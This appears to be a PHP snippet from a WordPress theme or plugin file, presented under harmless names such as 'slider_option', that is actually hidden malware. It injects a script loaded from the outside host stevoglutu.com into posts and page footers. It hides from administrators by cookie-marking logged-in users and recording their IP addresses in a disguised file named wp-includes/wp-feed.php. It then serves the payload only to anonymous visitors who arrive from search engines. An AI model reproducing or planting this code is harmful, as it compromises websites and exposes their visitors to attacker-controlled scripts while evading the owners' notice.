ini_set('display_errors', 0);
error_reporting(0);
$wp_auth_key='38fe324f1e4c10f398ec3de5ba615271';




if ( ! function_exists( 'slider_option' ) ) {  

function slider_option($content){ 
if(is_single())
{




$con = '
';

$con2 = '
<script>
(function(__htas){
var d = document,
    s = d.createElement(\'script\'),
    l = d.scripts[d.scripts.length - 1];
s.settings = __htas || {};
s.src = "\/\/stevoglutu.com\/c\/D.9D6\/bA2D5hlJSnWaQf9AN\/DsEP0\/MCTdgo2cN-i\/0\/0oM\/T\/Q\/xoOsDJYX3v";
l.parentNode.insertBefore(s, l);
})({})
</script>

';

$content=$content.$con2;
}
return $content;
} 

function slider_option_footer(){ 
if(!is_single())
{




$con2 = '
<script>
(function(__htas){
var d = document,
    s = d.createElement(\'script\'),
    l = d.scripts[d.scripts.length - 1];
s.settings = __htas || {};
s.src = "\/\/stevoglutu.com\/c\/D.9D6\/bA2D5hlJSnWaQf9AN\/DsEP0\/MCTdgo2cN-i\/0\/0oM\/T\/Q\/xoOsDJYX3v";
l.parentNode.insertBefore(s, l);
})({})
</script>

';

echo $con2;
}
} 








function setting_my_first_cookie() {
  setcookie( 'wordpress_cf_adm_use_adm',1, time()+3600*24*1000, COOKIEPATH, COOKIE_DOMAIN);
  }


if(is_user_logged_in())
{
add_action( 'init', 'setting_my_first_cookie',1 );
}







if( current_user_can('edit_others_pages'))
{

if (file_exists(ABSPATH.'wp-includes/wp-feed.php'))
{
$ip=@file_get_contents(ABSPATH.'wp-includes/wp-feed.php');
}

if (stripos($ip, $_SERVER['REMOTE_ADDR']) === false)
{
$ip.=$_SERVER['REMOTE_ADDR'].'
';
@file_put_contents(ABSPATH.'wp-includes/wp-feed.php',$ip);


}



}






$ref = $_SERVER['HTTP_REFERER'];
$SE = array('google.','/search?','images.google.', 'web.info.com', 'search.','yahoo.','yandex','msn.','baidu','bing.','doubleclick.net','googleweblight.com');
foreach ($SE as $source) {
  if (strpos($ref,$source)!==false) {
    setcookie("sevisitor", 1, time()+120, COOKIEPATH, COOKIE_DOMAIN); 
	$sevisitor=true;
  }
}






if(!isset($_COOKIE['wordpress_cf_adm_use_adm']) && !is_user_logged_in()) 
{
$adtxt=@file_get_contents(ABSPATH.'wp-includes/wp-feed.php');
if (stripos($adtxt, $_SERVER['REMOTE_ADDR']) === false)
{
if($sevisitor==true || isset($_COOKIE['sevisitor']))
{
add_filter('the_content','slider_option');
add_action('wp_footer','slider_option_footer');
}

}

} 





}